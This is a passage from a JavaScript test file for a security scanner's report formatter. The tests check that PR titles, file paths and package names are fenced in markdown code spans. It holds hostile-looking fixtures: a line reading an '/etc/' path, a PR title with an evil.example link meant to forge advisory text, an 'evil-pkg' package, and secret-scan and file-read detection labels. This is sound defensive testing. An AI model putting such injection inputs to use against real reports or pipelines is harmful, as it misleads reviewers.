  assert.ok(codeSpans(out).includes(line), `line escaped its span: ${out}`);
});

test('formatFlagList: markdown in the matched line does not become live markup', () => {
  const line = '+const p = readFile(`/etc/**OWNED**/x);';
  const out = formatFlagList([{ check: 'secret-scan', file: 'a.test.ts', pattern: 'High-entropy secret', line }]);
  assert.ok(codeSpans(out).includes(line), `line escaped its span: ${out}`);
});

test('formatFlagList: lockfile package names are fenced', () => {
  const packages = ['evil-pkg', 'md__bold__`x`'];
  const out = formatFlagList([{ check: 'supply-chain', packages }]);
  for (const name of packages) {
    assert.ok(codeSpans(out).includes(name), `package ${JSON.stringify(name)} is not fenced: ${out}`);
  }
});

// must-NOT-break fixture: the ordinary flag keeps its exact rendering, so a fix
// that over-escapes (backslashing every metacharacter, say) reds here.
test('formatFlagList: an ordinary flag renders exactly as before, plus the fence', () => {
  const out = formatFlagList([{ check: 'secret-scan', file: 'src/config.ts', pattern: 'OpenAI API key' }]);
  assert.equal(out, '- `secret-scan`: `src/config.ts` (pattern: OpenAI API key)');
});

// ── buildAdvisoryPayload: the PR title is repo-controlled too (PEN-6561) ─────
//
// `prTitle` is author free text, so it is repo-controlled exactly like `file`,
// `line` and `packages`. It is interpolated in `buildAdvisoryPayload`, one
// function away from the `formatFlagList` fences above, so an enumeration keyed
// on "which fields does formatFlagList interpolate?" cannot reach it. These pin
// the FIELD at its own interpolation site, not the function that carries it.

const advisoryTitleFlags = [{ check: 'secret-scan', file: 'server/src/a.ts', pattern: 'OpenAI API key' }];

// The advisory's PR line is the first line of the description; scoping to it
// keeps these assertions off the flag list's own (already fenced) spans.
function advisoryTitleLine(title) {
  return buildAdvisoryPayload(6469, title, advisoryTitleFlags).description.split('\n')[0];
}

test('buildAdvisoryPayload: a backtick in the PR title stays inside one code span', () => {
  const title = 'fix: drop the `--force` flag';
  const line = advisoryTitleLine(title);
  assert.ok(codeSpans(line).includes(title), `title is not inside a code span: ${line}`);
});

test('buildAdvisoryPayload: bold markers in the PR title do not render as emphasis', () => {
  const title = 'fix: **really** important';
  const line = advisoryTitleLine(title);
  assert.ok(codeSpans(line).includes(title), `title is not inside a code span: ${line}`);
});

test('buildAdvisoryPayload: a link in the PR title cannot forge advisory prose', () => {
  const title = 'fix [click here](https://evil.example) now';
  const line = advisoryTitleLine(title);
  assert.ok(codeSpans(line).includes(title), `title is not inside a code span: ${line}`);
});

test('buildAdvisoryPayload: an ordinary PR title round-trips unchanged', () => {
  const title = 'Add a retry to the uploader';
  const line = advisoryTitleLine(title);
  assert.deepEqual(codeSpans(line), [title], `ordinary title did not round-trip: ${line}`);
  assert.ok(line.startsWith('**PR:** #6469 — '), `the PR line lost its shape: ${line}`);
});

// ── formatCheckRunFlagList: the check-run summary ────────────────────────────

test('formatCheckRunFlagList: a __tests__ path is fenced in the check-run summary too', () => {
  const file = 'server/src/__tests__/a.test.ts';
  const text = formatCheckRunFlagList([{ check: 'suspicious-test', file, pattern: 'absolute-file-read' }]);
  assert.ok(codeSpans(text).includes(file), `path is not inside a code span: ${text}`);
});

test('formatCheckRunFlagList: an oversized part is dropped whole, never cut mid-span', () => {
  const packages = Array.from({ length: 400 }, (_, index) => `pkg-${index}-${'y'.repeat(20)}`);
  const text = formatCheckRunFlagList([{ check: 'supply-chain', file: 'pnpm-lock.yaml', packages }]);

  assert.ok(!text.includes('(packages:'), `the oversized part was cut rather than dropped: ${text.slice(0, 200)}`);
  assert.ok(codeSpans(text).includes('pnpm-lock.yaml'), 'the flag itself is still reported');
});

test('formatCheckRunFlagList: a packages list that fits is kept whole', () => {
  const text = formatCheckRunFlagList([{ check: 'supply-chain', file: 'pnpm-lock.yaml', packages: ['evil-pkg'] }]);
  assert.ok(codeSpans(text).includes('evil-pkg'), `small packages list was dropped: ${text}`);
});
